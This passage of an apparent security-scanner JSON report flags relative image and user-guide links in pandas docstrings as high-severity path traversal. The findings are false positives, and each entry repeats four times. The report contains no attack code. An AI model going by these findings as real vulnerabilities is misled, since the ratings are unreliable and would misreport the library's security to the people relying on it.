            "evidence": ".. figure:: ../../_static/style/footer_simple.png",
            "context": "        >>> styler = df.style.concat(df.agg([\"sum\"]).style)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_simple.png\n\n        Since the concatenated object is a Styler the existing functionality can be",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 376,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_extended.png",
            "context": "        >>> styler.concat(other)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_extended.png\n\n        When ``other`` has fewer index levels than the original Styler it is possible",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 376,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_extended.png",
            "context": "        >>> styler.concat(other)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_extended.png\n\n        When ``other`` has fewer index levels than the original Styler it is possible",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 376,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_extended.png",
            "context": "        >>> styler.concat(other)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_extended.png\n\n        When ``other`` has fewer index levels than the original Styler it is possible",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 376,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/footer_extended.png",
            "context": "        >>> styler.concat(other)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/footer_extended.png\n\n        When ``other`` has fewer index levels than the original Styler it is possible",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 766,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this",
            "context": "        been constructed with appropriate LaTeX commands. All styling\n        functionality is built around the concept of a CSS ``(<attribute>, <value>)``\n        pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this\n        should be replaced by a LaTeX\n        ``(<command>, <options>)`` approach. Each cell will be styled individually",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 766,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this",
            "context": "        been constructed with appropriate LaTeX commands. All styling\n        functionality is built around the concept of a CSS ``(<attribute>, <value>)``\n        pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this\n        should be replaced by a LaTeX\n        ``(<command>, <options>)`` approach. Each cell will be styled individually",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 766,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this",
            "context": "        been constructed with appropriate LaTeX commands. All styling\n        functionality is built around the concept of a CSS ``(<attribute>, <value>)``\n        pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this\n        should be replaced by a LaTeX\n        ``(<command>, <options>)`` approach. Each cell will be styled individually",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 766,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this",
            "context": "        been constructed with appropriate LaTeX commands. All styling\n        functionality is built around the concept of a CSS ``(<attribute>, <value>)``\n        pair (see `Table Visualization <../../user_guide/style.ipynb>`_), and this\n        should be replaced by a LaTeX\n        ``(<command>, <options>)`` approach. Each cell will be styled individually",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 823,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_1.png",
            "context": "        >>> s.to_latex()  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_1.png\n\n        **Table Styles**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 823,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_1.png",
            "context": "        >>> s.to_latex()  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_1.png\n\n        **Table Styles**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 823,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_1.png",
            "context": "        >>> s.to_latex()  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_1.png\n\n        **Table Styles**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 823,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_1.png",
            "context": "        >>> s.to_latex()  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_1.png\n\n        **Table Styles**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 884,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_2.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_2.png\n\n        **Formatting**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 884,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_2.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_2.png\n\n        **Formatting**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 884,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_2.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_2.png\n\n        **Formatting**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 884,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_2.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/latex_2.png\n\n        **Formatting**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1010,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks_html.png",
            "context": "        All the above styles will work with HTML (see below) and LaTeX upon conversion:\n\n        .. figure:: ../../_static/style/latex_stocks_html.png\n\n        However, we finally want to add one LaTeX only style",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1010,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks_html.png",
            "context": "        All the above styles will work with HTML (see below) and LaTeX upon conversion:\n\n        .. figure:: ../../_static/style/latex_stocks_html.png\n\n        However, we finally want to add one LaTeX only style",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1010,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks_html.png",
            "context": "        All the above styles will work with HTML (see below) and LaTeX upon conversion:\n\n        .. figure:: ../../_static/style/latex_stocks_html.png\n\n        However, we finally want to add one LaTeX only style",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1010,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks_html.png",
            "context": "        All the above styles will work with HTML (see below) and LaTeX upon conversion:\n\n        .. figure:: ../../_static/style/latex_stocks_html.png\n\n        However, we finally want to add one LaTeX only style",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1070,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks.png",
            "context": "        \\end{table}\n\n        .. figure:: ../../_static/style/latex_stocks.png\n        \"\"\"\n        obj = self._copy(deepcopy=True)  # manipulate table_styles on obj, not self",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1070,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks.png",
            "context": "        \\end{table}\n\n        .. figure:: ../../_static/style/latex_stocks.png\n        \"\"\"\n        obj = self._copy(deepcopy=True)  # manipulate table_styles on obj, not self",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1070,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks.png",
            "context": "        \\end{table}\n\n        .. figure:: ../../_static/style/latex_stocks.png\n        \"\"\"\n        obj = self._copy(deepcopy=True)  # manipulate table_styles on obj, not self",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1070,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/latex_stocks.png",
            "context": "        \\end{table}\n\n        .. figure:: ../../_static/style/latex_stocks.png\n        \"\"\"\n        obj = self._copy(deepcopy=True)  # manipulate table_styles on obj, not self",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1685,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # create default GH 40675",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1685,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # create default GH 40675",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1685,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # create default GH 40675",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1685,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        # create default GH 40675",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1840,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.apply(lambda s: total_style)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1840,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.apply(lambda s: total_style)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1840,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.apply(lambda s: total_style)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1840,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.apply(lambda s: total_style)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1935,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead1.png",
            "context": "        >>> df.style.{this}_index(color_b)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead1.png\n\n        Selectively applying to specific levels of MultiIndex columns.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1935,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead1.png",
            "context": "        >>> df.style.{this}_index(color_b)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead1.png\n\n        Selectively applying to specific levels of MultiIndex columns.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1935,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead1.png",
            "context": "        >>> df.style.{this}_index(color_b)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead1.png\n\n        Selectively applying to specific levels of MultiIndex columns.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1935,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead1.png",
            "context": "        >>> df.style.{this}_index(color_b)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead1.png\n\n        Selectively applying to specific levels of MultiIndex columns.",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1946,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead2.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead2.png\n        \"\"\"\n        self._todo.append(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1946,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead2.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead2.png\n        \"\"\"\n        self._todo.append(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1946,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead2.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead2.png\n        \"\"\"\n        self._todo.append(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1946,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/appmaphead2.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/appmaphead2.png\n        \"\"\"\n        self._todo.append(",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ...  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ...  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ...  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ...  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2308,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        self.uuid = uuid",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2308,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        self.uuid = uuid",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2308,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        self.uuid = uuid",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2308,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        self.uuid = uuid",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2334,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        msg = \"`caption` must be either a string or 2-tuple of strings.\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2334,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        msg = \"`caption` must be either a string or 2-tuple of strings.\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2334,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        msg = \"`caption` must be either a string or 2-tuple of strings.\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2334,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        msg = \"`caption` must be either a string or 2-tuple of strings.\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2390,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        axis = self.data._get_axis_number(axis)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2390,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        axis = self.data._get_axis_number(axis)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2390,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        axis = self.data._get_axis_number(axis)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2390,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        axis = self.data._get_axis_number(axis)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2591,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ... }, axis=1, overwrite=False)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2591,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ... }, axis=1, overwrite=False)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2591,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ... }, axis=1, overwrite=False)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2591,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        ... }, axis=1, overwrite=False)  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2927,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_ax0.png",
            "context": "        >>> df.style.{name}_gradient(axis=0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_ax0.png\n\n        Shading all values collectively using ``axis=None``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2927,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_ax0.png",
            "context": "        >>> df.style.{name}_gradient(axis=0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_ax0.png\n\n        Shading all values collectively using ``axis=None``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2927,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_ax0.png",
            "context": "        >>> df.style.{name}_gradient(axis=0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_ax0.png\n\n        Shading all values collectively using ``axis=None``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2927,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_ax0.png",
            "context": "        >>> df.style.{name}_gradient(axis=0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_ax0.png\n\n        Shading all values collectively using ``axis=None``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2933,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone.png",
            "context": "        >>> df.style.{name}_gradient(axis=None)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone.png\n\n        Compress the color map from the both ``low`` and ``high`` ends",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2933,
